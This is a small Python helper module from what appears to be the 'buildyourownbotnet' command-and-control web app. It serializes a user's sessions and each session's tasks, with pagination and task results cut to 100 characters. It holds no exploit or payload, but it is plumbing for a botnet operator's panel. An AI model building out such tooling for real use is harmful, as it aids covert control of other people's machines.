import os
import json
import string
import random
import requests

from threading import Thread

from buildyourownbotnet.core import dao
from buildyourownbotnet import app

from flask import url_for
from flask_mail import Message

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), 'output')


def get_sessions_serialized(user_id):
	"""Return serialized list of sessions for a given user."""
	return [session.serialize() for session in dao.get_user_sessions(user_id)]


def get_tasks_serialized(session_uid):
	"""Return serialized list of tasks for a given session."""
	tasks = dao.get_session_tasks(session_uid)
	serialized_tasks = []
	for task in tasks:
		task = task.serialize()
		if task.get('result'):
			task['result'] = task['result'][:100]
		serialized_tasks.append(task)
	return serialized_tasks


def get_tasks_serialized_paginated(session_id, page=1):
	"""Return serialized list of tasks for a given session (paginated)."""
	tasks, pages = dao.get_session_tasks_paginated(session_id, page=page)
	serialized_tasks = []
	for task in tasks:
		task = task.serialize()
		if task.get('result'):
			task['result'] = task['result'][:100]
		serialized_tasks.append(task)
	return serialized_tasks, pages
